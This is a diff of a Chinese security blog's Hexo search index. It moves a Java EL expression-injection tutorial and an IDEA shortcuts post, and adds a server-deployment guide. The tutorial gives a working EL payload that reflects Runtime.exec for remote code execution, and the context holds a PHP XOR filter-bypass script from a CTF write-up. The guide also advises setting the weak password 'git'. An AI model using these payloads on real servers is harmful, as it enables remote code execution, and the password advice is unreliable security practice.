@@ -51,6 +51,78 @@
       </tags>
   </entry>
   <entry>
+    <title>JavaEL表达式注入</title>
+    <url>/Inject/JAVA%20EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><center>前言</center></h1><p>之前一直打算写一篇解析，拖了一久就开始写了。</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownAvYBeWiOuR3talo.png"></p>
+<span id="more"></span>
+
+<h1 id="JAVA反射机制"><a href="#JAVA反射机制" class="headerlink" title="JAVA反射机制"></a><center>JAVA反射机制</center></h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>JAVA反射机制是在运行状态中，<strong>对于任意一个类，都能够知道这个类的所有属性和方法</strong>；<strong>对于任意一个对象，都能够调用它的任意一个方法和属性</strong>；这种<code>动态获取的信息</code>以及<code>动态调用对象</code>的方法的功能称为<code>java语言的反射机制</code>。<br>要想解剖一个类,必须先要获取到该类的字节码文件对象。而解剖使用的就是Class类中的方法.所以先要获取到每一个字节码文件对应的Class类型的对象.</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdowngSvljhYbHELAnpt.png"></p>
+<ul>
+<li>Java中编译类型有两种：<ul>
+<li><strong>静态编译</strong>：在编译时确定类型，绑定对象即通过。</li>
+<li><strong>动态编译</strong>：运行时确定类型，绑定对象。动态编译最大限度地发挥了Java的灵活性，体现了多态的应用，可以减低类之间的耦合性。</li>
+</ul>
+</li>
+<li>实现Java反射机制的类都位于<code>java.lang.reflect</code>包中：<ol>
+<li>Class类：代表一个类</li>
+<li>Field类：代表类的成员变量（类的属性）</li>
+<li>Method类：代表类的方法</li>
+<li>Constructor类：代表类的构造方法</li>
+<li>Array类：提供了动态创建数组，以及访问数组的元素的静态方法</li>
+</ol>
+</li>
+</ul>
+<p><strong>一句话概括就是使用反射可以赋予jvm动态编译的能力，否则类的元数据信息只能用静态编译的方式实现，例如热加载，Tomcat的classloader等等都没法支持。</strong></p>
+<h1 id="EL表达式基础"><a href="#EL表达式基础" class="headerlink" title="EL表达式基础"></a><center>EL表达式基础</center></h1><p>EL表达式是为了转化为JSP代码的，简洁表达式形式，相比直接使用JSP，EL表达式拥有更好的可读性。</p>
+<p>EL 表达式语法如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;EL表达式&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>EL 表达式语法以<code>$&#123;</code>开头，以<code>&#125;</code>结束，中间为合法的表达式。</p>
+<h1 id="EL表达式注入原理解析"><a href="#EL表达式注入原理解析" class="headerlink" title="EL表达式注入原理解析"></a><center>EL表达式注入原理解析</center></h1><p><code>pagecontext</code>域可操纵<code>request</code> <code>session</code> <code>application</code>，而这几个域里面均有setAttribute方法</p>
+<ul>
+<li><p>Attribute方法</p>
+<ul>
+<li>这个方法作用就是<strong>保存数据</strong>，然后还可以用<code>getAttribute</code>方法来取出。</li>
+</ul>
+</li>
+<li><p>反射中的Method类的invoke() 和getMethod()</p>
+<ul>
+<li>getMethod() → 获得对象所声明的公开方法  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">person.getClass().getMethod(<span class="string">&quot;Speak&quot;</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
+  获得person对象的Speak方法，因为Speak方法没有形参，所以parameterTypes为null</li>
+</ul>
+</li>
+<li><p>getRuntime()方法<br>  <code>java.lang.Runtime.getRuntime() </code>方法返回与当前Java应用程序相关的运行时对象。大多数Runtime类的方法是实例方法，必须相对于当前的运行时对象被调用。</p>
+</li>
+</ul>
+<p>invoke()方法</p>
+<ul>
+<li>getInputStream方法<ul>
+<li><code>getInputStream()方法</code>在java.lang包中可用。</li>
+<li><code>getInputStream()方法</code>用于获取流程和子流程的输入流。</li>
+<li><code>getInputStream()方法</code>是一个非静态方法，只能通过类对象访问，如果尝试使用类名称访问该方法，则会收到错误消息。</li>
+<li>返回输入流时，<code>getInputStream()方法</code>不会引发异常。</li>
+</ul>
+</li>
+</ul>
+<p>pagecontext域控制request.getSession()调用其中的getAttribute，getAttribute方法取出任意值a，<code>pageContext.request.getClass().forName(&#39;java.lang.Runtime&#39;)</code>吧<code>java.lang.Runtime</code>反射出来，调用<code>java.lang.Runtime</code> 中的方法<code>getMethod（）</code> ，获得相应对象的getRuntime()方法,得到相关的Method对象，<code>invoke(null,null)</code> 反射得到exec()方法，getInputStream()方法简而言之就是可以有回显。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;pageContext.request.getSession().setAttribute(<span class="string">&#x27;a&#x27;</span>,pageContext.request.getClass().forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="string">&#x27;getRuntime&#x27;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(<span class="string">&#x27;calc&#x27;</span>).getInputStream())&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>Inject</tag>
+        <tag>JAVA</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CTFShow-PHP特性</title>
     <url>/WP/CTFShow-PHP%E7%89%B9%E6%80%A7/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>新姿势，记录记录。</p>
@@ -573,74 +645,78 @@
       </tags>
   </entry>
   <entry>
-    <title>JavaEL表达式注入</title>
-    <url>/Inject/JAVA%20EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><center>前言</center></h1><p>之前一直打算写一篇解析，拖了一久就开始写了。</p>
-<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownAvYBeWiOuR3talo.png"></p>
+    <title>IDEA快捷生成代码</title>
+    <url>/JAVA/IDEA%E5%BF%AB%E6%8D%B7%E7%94%9F%E6%88%90%E4%BB%A3%E7%A0%81/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>准备吧JAVA作为主要使用语言写POC，所有记一下</p>
 <span id="more"></span>
 
-<h1 id="JAVA反射机制"><a href="#JAVA反射机制" class="headerlink" title="JAVA反射机制"></a><center>JAVA反射机制</center></h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>JAVA反射机制是在运行状态中，<strong>对于任意一个类，都能够知道这个类的所有属性和方法</strong>；<strong>对于任意一个对象，都能够调用它的任意一个方法和属性</strong>；这种<code>动态获取的信息</code>以及<code>动态调用对象</code>的方法的功能称为<code>java语言的反射机制</code>。<br>要想解剖一个类,必须先要获取到该类的字节码文件对象。而解剖使用的就是Class类中的方法.所以先要获取到每一个字节码文件对应的Class类型的对象.</p>
-<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdowngSvljhYbHELAnpt.png"></p>
-<ul>
-<li>Java中编译类型有两种：<ul>
-<li><strong>静态编译</strong>：在编译时确定类型，绑定对象即通过。</li>
-<li><strong>动态编译</strong>：运行时确定类型，绑定对象。动态编译最大限度地发挥了Java的灵活性，体现了多态的应用，可以减低类之间的耦合性。</li>
-</ul>
-</li>
-<li>实现Java反射机制的类都位于<code>java.lang.reflect</code>包中：<ol>
-<li>Class类：代表一个类</li>
-<li>Field类：代表类的成员变量（类的属性）</li>
-<li>Method类：代表类的方法</li>
-<li>Constructor类：代表类的构造方法</li>
-<li>Array类：提供了动态创建数组，以及访问数组的元素的静态方法</li>
-</ol>
-</li>
-</ul>
-<p><strong>一句话概括就是使用反射可以赋予jvm动态编译的能力，否则类的元数据信息只能用静态编译的方式实现，例如热加载，Tomcat的classloader等等都没法支持。</strong></p>
-<h1 id="EL表达式基础"><a href="#EL表达式基础" class="headerlink" title="EL表达式基础"></a><center>EL表达式基础</center></h1><p>EL表达式是为了转化为JSP代码的，简洁表达式形式，相比直接使用JSP，EL表达式拥有更好的可读性。</p>
-<p>EL 表达式语法如下：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;EL表达式&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="psvm"><a href="#psvm" class="headerlink" title="psvm"></a>psvm</h1><pre><code>//生成main方法:
+public static void main(String[] args) &#123;&#125;
+</code></pre>
+<h1 id="sout"><a href="#sout" class="headerlink" title="sout"></a>sout</h1><pre><code>//生成打印输出:
+System.out.println();
+</code></pre>
+<h1 id="“abc”-sout"><a href="#“abc”-sout" class="headerlink" title="“abc”.sout"></a>“abc”.sout</h1><pre><code>//生成打印字符串:
+System.out.println(&quot;adc&quot;);
+</code></pre>
+<h1 id="“abc”-format"><a href="#“abc”-format" class="headerlink" title="“abc”.format"></a>“abc”.format</h1><pre><code>//生成字符串格式化:
+String.format(&quot;abc&quot; )
+</code></pre>
+<h1 id="itli"><a href="#itli" class="headerlink" title="itli"></a>itli</h1><pre><code>    //生成for循环
+ for (int i = 0; i &lt; list.size(); i++) &#123;
+    String s =  list.get(i);
+ &#125;
+</code></pre>
+<h1 id="itco"><a href="#itco" class="headerlink" title="itco"></a>itco</h1><pre><code>   /// 生成Collection迭代器
+ for (Iterator&lt;String&gt; iterator = list.iterator(); iterator.hasNext(); ) &#123;
+     String next =  iterator.next();   
+ &#125;
+</code></pre>
+<h1 id="iter"><a href="#iter" class="headerlink" title="iter"></a>iter</h1><pre><code>   ///生成增强for循环
+ for (String s : list) &#123;       
+ &#125;
+</code></pre>
+<h1 id="iten"><a href="#iten" class="headerlink" title="iten"></a>iten</h1><pre><code>    ///生成 enumeration遍历
+ while (enumeration.hasMoreElements()) &#123;
+    Object nextElement =  enumeration.nextElement();   
+ &#125;
+</code></pre>
+<h1 id="itar"><a href="#itar" class="headerlink" title="itar"></a>itar</h1><pre><code>    ///生成数组for循环
+ int[] array = &#123;12345&#125;;
+ for (int i = 0; i &lt; array.length; i++) &#123;
+    int i1 = array[i]; 
+ &#125;
+</code></pre>
+<h1 id="itit"><a href="#itit" class="headerlink" title="itit"></a>itit</h1><pre><code>  ///生成迭代器 iterator
+ Iterator iterator = list.iterator();
+ while (iterator.hasNext()) &#123;
+    Object next =  iterator.next();
+ &#125;
+</code></pre>
+<h1 id="ittok"><a href="#ittok" class="headerlink" title="ittok"></a>ittok</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   //ittok  生成String token遍历</span><br><span class="line">for (StringTokenizer stringTokenizer = new StringTokenizer(APP_NAME); stringTokenizer.hasMoreTokens(); ) &#123;</span><br><span class="line">   String s = stringTokenizer.nextToken();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<h1 id="itws"><a href="#itws" class="headerlink" title="itws"></a>itws</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成Axis2 web service调用</span><br><span class="line">try &#123;</span><br><span class="line">    MyServiceLocator locator = new MyServiceLocator();</span><br><span class="line">    Activator service = locator.get();</span><br><span class="line">    // If authorization is required</span><br><span class="line">    //((MyService_Soap_BindingStub)service).setUsername(&quot;user3&quot;);</span><br><span class="line">    //((MyService_Soap_BindingStub)service).setPassword(&quot;pass3&quot;);</span><br><span class="line">    // invoke business method</span><br><span class="line">    service.businessMethod();</span><br><span class="line">&#125; catch (javax.xml.rpc.ServiceException ex) &#123;</span><br><span class="line">    ex.printStackTrace();</span><br><span class="line">&#125; catch (java.rmi.RemoteException ex) &#123;</span><br><span class="line">    ex.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>EL 表达式语法以<code>$&#123;</code>开头，以<code>&#125;</code>结束，中间为合法的表达式。</p>
-<h1 id="EL表达式注入原理解析"><a href="#EL表达式注入原理解析" class="headerlink" title="EL表达式注入原理解析"></a><center>EL表达式注入原理解析</center></h1><p><code>pagecontext</code>域可操纵<code>request</code> <code>session</code> <code>application</code>，而这几个域里面均有setAttribute方法</p>
-<ul>
-<li><p>Attribute方法</p>
-<ul>
-<li>这个方法作用就是<strong>保存数据</strong>，然后还可以用<code>getAttribute</code>方法来取出。</li>
-</ul>
-</li>
-<li><p>反射中的Method类的invoke() 和getMethod()</p>
-<ul>
-<li>getMethod() → 获得对象所声明的公开方法  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">person.getClass().getMethod(<span class="string">&quot;Speak&quot;</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
-  获得person对象的Speak方法，因为Speak方法没有形参，所以parameterTypes为null</li>
-</ul>
-</li>
-<li><p>getRuntime()方法<br>  <code>java.lang.Runtime.getRuntime() </code>方法返回与当前Java应用程序相关的运行时对象。大多数Runtime类的方法是实例方法，必须相对于当前的运行时对象被调用。</p>
-</li>
-</ul>
-<p>invoke()方法</p>
-<ul>
-<li>getInputStream方法<ul>
-<li><code>getInputStream()方法</code>在java.lang包中可用。</li>
-<li><code>getInputStream()方法</code>用于获取流程和子流程的输入流。</li>
-<li><code>getInputStream()方法</code>是一个非静态方法，只能通过类对象访问，如果尝试使用类名称访问该方法，则会收到错误消息。</li>
-<li>返回输入流时，<code>getInputStream()方法</code>不会引发异常。</li>
-</ul>
-</li>
-</ul>
-<p>pagecontext域控制request.getSession()调用其中的getAttribute，getAttribute方法取出任意值a，<code>pageContext.request.getClass().forName(&#39;java.lang.Runtime&#39;)</code>吧<code>java.lang.Runtime</code>反射出来，调用<code>java.lang.Runtime</code> 中的方法<code>getMethod（）</code> ，获得相应对象的getRuntime()方法,得到相关的Method对象，<code>invoke(null,null)</code> 反射得到exec()方法，getInputStream()方法简而言之就是可以有回显。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;pageContext.request.getSession().setAttribute(<span class="string">&#x27;a&#x27;</span>,pageContext.request.getClass().forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="string">&#x27;getRuntime&#x27;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(<span class="string">&#x27;calc&#x27;</span>).getInputStream())&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="try-如-”abc”-try"><a href="#try-如-”abc”-try" class="headerlink" title="try 如:”abc”.try"></a>try 如:”abc”.try</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/// 生成try.....catch</span><br><span class="line">     try &#123;</span><br><span class="line">         &quot;abc&quot;</span><br><span class="line">     &#125; catch (Exception e) &#123;</span><br><span class="line">       e.printStackTrace();</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
 
+<h1 id="ifn"><a href="#ifn" class="headerlink" title="ifn"></a>ifn</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成判断是否为空  </span><br><span class="line">  if (list == null) &#123;</span><br><span class="line">  &#125;2</span><br></pre></td></tr></table></figure>
 
+<h1 id="inn"><a href="#inn" class="headerlink" title="inn"></a>inn</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成判断是否不为空  </span><br><span class="line"> if (list != null) &#123;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
 
+<h1 id="fori"><a href="#fori" class="headerlink" title="fori"></a>fori</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成简单for循环</span><br><span class="line">  for (int i = 0; i &lt; ; i++) &#123; </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
 
+<h1 id="inst"><a href="#inst" class="headerlink" title="inst"></a>inst</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成是否是该对象引用</span><br><span class="line"> if (list instanceof Object) &#123;</span><br><span class="line">      Object o = (Object) list; </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="psf"><a href="#psf" class="headerlink" title="psf"></a>psf</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成 共有 静态最终的</span><br><span class="line"> public static final</span><br></pre></td></tr></table></figure>
+
+<h1 id="psfi"><a href="#psfi" class="headerlink" title="psfi"></a>psfi</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成 共有 静态最终的 int</span><br><span class="line"> public static final int </span><br></pre></td></tr></table></figure>
+
+<h1 id="psfs"><a href="#psfs" class="headerlink" title="psfs"></a>psfs</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成 共有 静态最终的 String</span><br><span class="line"> public static final String </span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>Web安全</category>
+        <category>语言学习总结</category>
       </categories>
       <tags>
-        <tag>Inject</tag>
         <tag>JAVA</tag>
       </tags>
   </entry>
@@ -906,82 +982,6 @@
       </categories>
       <tags>
         <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>IDEA快捷生成代码</title>
-    <url>/JAVA/IDEA%E5%BF%AB%E6%8D%B7%E7%94%9F%E6%88%90%E4%BB%A3%E7%A0%81/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>准备吧JAVA作为主要使用语言写POC，所有记一下</p>
-<span id="more"></span>
-
-<h1 id="psvm"><a href="#psvm" class="headerlink" title="psvm"></a>psvm</h1><pre><code>//生成main方法:
-public static void main(String[] args) &#123;&#125;
-</code></pre>
-<h1 id="sout"><a href="#sout" class="headerlink" title="sout"></a>sout</h1><pre><code>//生成打印输出:
-System.out.println();
-</code></pre>
-<h1 id="“abc”-sout"><a href="#“abc”-sout" class="headerlink" title="“abc”.sout"></a>“abc”.sout</h1><pre><code>//生成打印字符串:
-System.out.println(&quot;adc&quot;);
-</code></pre>
-<h1 id="“abc”-format"><a href="#“abc”-format" class="headerlink" title="“abc”.format"></a>“abc”.format</h1><pre><code>//生成字符串格式化:
-String.format(&quot;abc&quot; )
-</code></pre>
-<h1 id="itli"><a href="#itli" class="headerlink" title="itli"></a>itli</h1><pre><code>    //生成for循环
- for (int i = 0; i &lt; list.size(); i++) &#123;
-    String s =  list.get(i);
- &#125;
-</code></pre>
-<h1 id="itco"><a href="#itco" class="headerlink" title="itco"></a>itco</h1><pre><code>   /// 生成Collection迭代器
- for (Iterator&lt;String&gt; iterator = list.iterator(); iterator.hasNext(); ) &#123;
-     String next =  iterator.next();   
- &#125;
-</code></pre>
-<h1 id="iter"><a href="#iter" class="headerlink" title="iter"></a>iter</h1><pre><code>   ///生成增强for循环
- for (String s : list) &#123;       
- &#125;
-</code></pre>
-<h1 id="iten"><a href="#iten" class="headerlink" title="iten"></a>iten</h1><pre><code>    ///生成 enumeration遍历
- while (enumeration.hasMoreElements()) &#123;
-    Object nextElement =  enumeration.nextElement();   
- &#125;
-</code></pre>
-<h1 id="itar"><a href="#itar" class="headerlink" title="itar"></a>itar</h1><pre><code>    ///生成数组for循环
- int[] array = &#123;12345&#125;;
- for (int i = 0; i &lt; array.length; i++) &#123;
-    int i1 = array[i]; 
- &#125;
-</code></pre>
-<h1 id="itit"><a href="#itit" class="headerlink" title="itit"></a>itit</h1><pre><code>  ///生成迭代器 iterator
- Iterator iterator = list.iterator();
- while (iterator.hasNext()) &#123;
-    Object next =  iterator.next();
- &#125;
-</code></pre>
-<h1 id="ittok"><a href="#ittok" class="headerlink" title="ittok"></a>ittok</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   //ittok  生成String token遍历</span><br><span class="line">for (StringTokenizer stringTokenizer = new StringTokenizer(APP_NAME); stringTokenizer.hasMoreTokens(); ) &#123;</span><br><span class="line">   String s = stringTokenizer.nextToken();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="itws"><a href="#itws" class="headerlink" title="itws"></a>itws</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成Axis2 web service调用</span><br><span class="line">try &#123;</span><br><span class="line">    MyServiceLocator locator = new MyServiceLocator();</span><br><span class="line">    Activator service = locator.get();</span><br><span class="line">    // If authorization is required</span><br><span class="line">    //((MyService_Soap_BindingStub)service).setUsername(&quot;user3&quot;);</span><br><span class="line">    //((MyService_Soap_BindingStub)service).setPassword(&quot;pass3&quot;);</span><br><span class="line">    // invoke business method</span><br><span class="line">    service.businessMethod();</span><br><span class="line">&#125; catch (javax.xml.rpc.ServiceException ex) &#123;</span><br><span class="line">    ex.printStackTrace();</span><br><span class="line">&#125; catch (java.rmi.RemoteException ex) &#123;</span><br><span class="line">    ex.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="try-如-”abc”-try"><a href="#try-如-”abc”-try" class="headerlink" title="try 如:”abc”.try"></a>try 如:”abc”.try</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/// 生成try.....catch</span><br><span class="line">     try &#123;</span><br><span class="line">         &quot;abc&quot;</span><br><span class="line">     &#125; catch (Exception e) &#123;</span><br><span class="line">       e.printStackTrace();</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="ifn"><a href="#ifn" class="headerlink" title="ifn"></a>ifn</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成判断是否为空  </span><br><span class="line">  if (list == null) &#123;</span><br><span class="line">  &#125;2</span><br></pre></td></tr></table></figure>
-
-<h1 id="inn"><a href="#inn" class="headerlink" title="inn"></a>inn</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成判断是否不为空  </span><br><span class="line"> if (list != null) &#123;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="fori"><a href="#fori" class="headerlink" title="fori"></a>fori</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成简单for循环</span><br><span class="line">  for (int i = 0; i &lt; ; i++) &#123; </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="inst"><a href="#inst" class="headerlink" title="inst"></a>inst</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成是否是该对象引用</span><br><span class="line"> if (list instanceof Object) &#123;</span><br><span class="line">      Object o = (Object) list; </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="psf"><a href="#psf" class="headerlink" title="psf"></a>psf</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成 共有 静态最终的</span><br><span class="line"> public static final</span><br></pre></td></tr></table></figure>
-
-<h1 id="psfi"><a href="#psfi" class="headerlink" title="psfi"></a>psfi</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成 共有 静态最终的 int</span><br><span class="line"> public static final int </span><br></pre></td></tr></table></figure>
-
-<h1 id="psfs"><a href="#psfs" class="headerlink" title="psfs"></a>psfs</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成 共有 静态最终的 String</span><br><span class="line"> public static final String </span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>语言学习总结</category>
-      </categories>
-      <tags>
-        <tag>JAVA</tag>
       </tags>
   </entry>
   <entry>
@@ -1311,7 +1311,7 @@ String.format(&quot;abc&quot; )
 
 
 <p>执行即可得到</p>
-<p><img src="/image/image_2.png"></p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220331113835.png"></p>
 <p>然后构造出system字符串拿flag。</p>
 <h1 id="异或→EXP"><a href="#异或→EXP" class="headerlink" title="异或→EXP"></a>异或→EXP</h1><p>为了应对多种情况，放个羽师傅的脚本。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*author yu22x*/</span><br><span class="line"></span><br><span class="line">$myfile = fopen(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">$contents=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123; </span><br><span class="line">  <span class="keyword">for</span> ($j=<span class="number">0</span>; $j &lt;<span class="number">256</span> ; $j++) &#123; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($i&lt;<span class="number">16</span>)&#123;</span><br><span class="line">      $hex_i=<span class="string">&#x27;0&#x27;</span>.dechex($i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      $hex_i=dechex($i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($j&lt;<span class="number">16</span>)&#123;</span><br><span class="line">      $hex_j=<span class="string">&#x27;0&#x27;</span>.dechex($j);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      $hex_j=dechex($j);</span><br><span class="line">    &#125;</span><br><span class="line">    $preg = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; //根据题目给的正则表达式修改即可</span><br><span class="line">    <span class="keyword">if</span>(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;</span><br><span class="line">          echo <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="string">&#x27;%&#x27;</span>.$hex_i;</span><br><span class="line">    $b=<span class="string">&#x27;%&#x27;</span>.$hex_j;</span><br><span class="line">    $c=(urldecode($a)^urldecode($b));</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">ord</span>($c)&gt;=<span class="number">32</span>&amp;<span class="built_in">ord</span>($c)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">      $contents=$contents.$c.<span class="string">&quot; &quot;</span>.$a.<span class="string">&quot; &quot;</span>.$b.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite($myfile,$contents);</span><br><span class="line">fclose($myfile);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -1628,6 +1628,127 @@ String.format(&quot;abc&quot; )
       </tags>
   </entry>
   <entry>
+    <title>hexo部署到阿里云服务器</title>
+    <url>/bolg/hexo%E9%83%A8%E7%BD%B2%E5%88%B0%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>域名还没下来，就先用gitee，但是先记录一下自己hexo部署过程o(<em>￣▽￣</em>)o</p>
+</blockquote>
+<span id="more"></span>
+
+<blockquote>
+<p>这里说一下vim的基本操作方便不会的同学进行搭建<br>i–&gt;编辑<br>按一下ESC输入:wq–&gt;保存并退出（冒号也要输入啊！）<br>按一下ESC输入:!wq–&gt;保存并强制退出</p>
+</blockquote>
+<h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><ul>
+<li>本地hexo构建可运行发布</li>
+<li>阿里云服务器能访问</li>
+<li>有一个域名(非必须项，可以公网ip查看嘛~)</li>
+<li>Xshell和Xftp且已连接至服务器（怎么连接自行百度，这里就不做过多讲解）</li>
+</ul>
+<h3 id="服务器环境"><a href="#服务器环境" class="headerlink" title="服务器环境"></a>服务器环境</h3><ul>
+<li>Ubantu 20.04</li>
+</ul>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul>
+<li>回顾一下Hexo发布到gitee（Pages）的流程：</li>
+<li>本地计算机用Hexo构建静态文件public</li>
+<li>关键一步就是git上传github或gitee</li>
+<li>发布Pages将仓库目录<a href="https://gitee.com/cungudafa/cungudafa/index.html%E6%8B%89%E5%8F%96%E5%88%B0https://cungudafa.gitee.io/index.html">https://gitee.com/cungudafa/cungudafa/index.html拉取到https://cungudafa.gitee.io/index.html</a></li>
+</ul>
+<p><img src="https://s3.ax1x.com/2020/12/06/DXOrtg.png"><br>当然我们需要上传的是public文件夹；每次xftp手动上传肯定是不现实且麻烦的，所以我们接下来要在服务器安装git。</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="服务器创建服务器创建git用户"><a href="#服务器创建服务器创建git用户" class="headerlink" title="服务器创建服务器创建git用户"></a>服务器创建服务器创建git用户</h3><h4 id="创建一个git用户，用来运行git服务。（root不安全）"><a href="#创建一个git用户，用来运行git服务。（root不安全）" class="headerlink" title="创建一个git用户，用来运行git服务。（root不安全）"></a>创建一个git用户，用来运行git服务。（root不安全）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo useradd git -m</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>注意：Ubantu下必须加上-m，才会自动新建用户目录&#x2F;home&#x2F;git&#x2F;（后面配置和博客文件都放在这里）<br>在&#x2F;home&#x2F;git&#x2F;非常重要，如果出错，可以删除sudo userdel -r git用户，重新之前的步骤。</p>
+</blockquote>
+<h4 id="设置密码"><a href="#设置密码" class="headerlink" title="设置密码"></a>设置密码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo passwd git</span><br></pre></td></tr></table></figure>
+<p>密码就是git吧，简单为上。</p>
